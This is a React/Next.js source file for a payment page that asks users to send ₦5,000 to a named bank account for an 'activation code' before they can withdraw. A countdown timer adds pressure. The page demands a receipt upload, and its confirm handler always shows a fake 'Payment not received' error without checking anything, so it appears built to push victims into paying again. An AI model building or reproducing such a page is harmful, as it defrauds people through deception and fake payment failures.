"use client"

import type React from "react"

import { useState, useEffect } from "react"
import { useRouter } from "next/navigation"
import { Copy, Upload } from "lucide-react"
import LoadingOverlay from "@/components/loading-overlay"

export default function PaymentPage() {
  const router = useRouter()
  const [minutes, setMinutes] = useState(7)
  const [seconds, setSeconds] = useState(43)
  const [isLoading, setIsLoading] = useState(false)
  const [showError, setShowError] = useState(false)
  const [selectedFile, setSelectedFile] = useState<File | null>(null)
  const [copiedText, setCopiedText] = useState("")

  useEffect(() => {
    const timer = setInterval(() => {
      if (seconds > 0) {
        setSeconds(seconds - 1)
      } else if (minutes > 0) {
        setMinutes(minutes - 1)
        setSeconds(59)
      } else {
        clearInterval(timer)
      }
    }, 1000)

    return () => clearInterval(timer)
  }, [minutes, seconds])

  // Update the handleConfirmPayment function to check for receipt upload
  const handleConfirmPayment = () => {
    if (!selectedFile) {
      alert("Please upload your payment receipt before confirming payment")
      return
    }

    setIsLoading(true)

    setTimeout(() => {
      setIsLoading(false)
      setShowError(true)
    }, 3000)
  }

  const handleRetry = () => {
    setIsLoading(true)

    setTimeout(() => {
      setIsLoading(false)
      setShowError(false)
    }, 2000)
  }

  const handleCancel = () => {
    router.push("/withdraw/pin")
  }

  const copyToClipboard = (text: string) => {
    navigator.clipboard.writeText(text)
    setCopiedText(text)
    setTimeout(() => setCopiedText(""), 2000)
  }

  const handleFileChange = (event: React.ChangeEvent<HTMLInputElement>) => {
    if (event.target.files && event.target.files[0]) {
      setSelectedFile(event.target.files[0])
    }
  }

  return (
    <main className="flex min-h-screen flex-col items-center p-4 bg-black">
      <div className="w-full max-w-sm mt-4 flex flex-col items-center">
        {/* Payment Notice */}
        <div className="w-full bg-green-500 rounded-lg p-3 mb-3 text-sm">
          <p className="text-white">
            Hello dear user Kindly make a one time payment of ₦5,000 to purchase your personal activation code.
          </p>
          <p className="text-white mt-1 flex items-center text-xs">
            <span className="text-yellow-300 mr-1">⚠</span> NOTE: two users can not use same code to avoid being banned
            🚫
          </p>
        </div>

        {/* Timer */}
        <div className="w-full bg-green-500 rounded-lg p-2 mb-3">
          <div className="text-center text-white text-xl font-bold">
            {String(minutes).padStart(2, "0")} : {String(seconds).padStart(2, "0")}
          </div>
        </div>

        {/* Transfer Pending */}
        <div className="w-full text-center mb-3">
          <p className="text-white text-base font-bold">TRANSFER PENDING</p>
          <div className="w-10 h-10 bg-white rounded-full flex items-center justify-center mx-auto my-1">
            <span className="text-green-500 text-xl">N</span>
          </div>
        </div>

        {/* Account Details */}
        <div className="w-full bg-black border border-green-500 rounded-lg p-3 mb-3 text-sm">
          <div className="flex justify-between items-center">
            <p className="text-white flex items-center">
              <span className="bg-blue-500 text-white px-1 mr-2 text-xs">🏦</span>
              Acc : 5158988085
            </p>
            <button
              onClick={() => copyToClipboard("5158988085")}
              className="text-green-500 hover:text-green-400"
              title="Copy account number"
            >
              <Copy size={16} />
            </button>
          </div>
          {copiedText === "5158988085" && <p className="text-green-500 text-xs mt-1">Account number copied!</p>}
          <p className="text-white flex items-center mt-2">
            <span className="bg-blue-500 text-white px-1 mr-2 text-xs">👤</span>
            Name : Abednego Ishaya    </p>
          <p className="text-white flex items-center mt-2">
            <span className="bg-blue-500 text-white px-1 mr-2 text-xs">🏦</span>
            Bank: MoniePoint
          </p>
          <div className="flex justify-between items-center mt-2">
            <p className="text-white flex items-center">
              <span className="bg-blue-500 text-white px-1 mr-2 text-xs">💰</span>
              Amount : ₦5,000
            </p>
            <button
              onClick={() => copyToClipboard("5000")}
              className="text-green-500 hover:text-green-400"
              title="Copy amount"
            >
              <Copy size={16} />
            </button>
          </div>
          {copiedText === "5000" && <p className="text-green-500 text-xs mt-1">Amount copied!</p>}
        </div>

        {/* Upload Receipt */}
        <div className="w-full mb-3 border border-green-500 rounded-lg p-3">
          <p className="text-white text-sm mb-2 font-medium">Upload Payment Receipt (Required)</p>
          <label className="flex items-center justify-center gap-2 bg-gray-700 hover:bg-gray-600 text-white font-medium py-2 px-4 rounded-md cursor-pointer">
            <Upload size={18} />
            {selectedFile ? selectedFile.name.substring(0, 15) + "..." : "Upload Receipt"}
            <input type="file" accept="image/*" onChange={handleFileChange} className="hidden" id="receipt-upload" />
          </label>
          {selectedFile && <p className="text-green-500 text-xs text-center mt-1">Receipt uploaded successfully!</p>}
          {!selectedFile && <p className="text-yellow-300 text-xs text-center mt-1">⚠ Receipt upload is required</p>}
        </div>

        <button onClick={handleConfirmPayment} className="w-full bg-green-500 text-white font-bold py-3 rounded-md">
          CONFIRM PAYMENT
        </button>
      </div>

      {/* Error Popup */}
      {showError && (
        <div className="fixed inset-0 bg-black bg-opacity-50 flex items-center justify-center z-50">
          <div className="bg-white p-6 rounded-lg w-full max-w-xs">
            <h2 className="text-xl font-bold text-red-500 mb-4">Bad Request</h2>
            <p className="text-gray-700 mb-6">Payment not received. Please check your payment details and try again.</p>
            <div className="flex justify-end space-x-3">
              <button onClick={handleCancel} className="px-4 py-2 bg-gray-200 text-gray-800 rounded-md">
                Cancel
              </button>
              <button onClick={handleRetry} className="px-4 py-2 bg-green-500 text-white rounded-md">
                Retry
              </button>
            </div>
          </div>
        </div>
      )}

      {isLoading && <LoadingOverlay />}
    </main>
  )
}
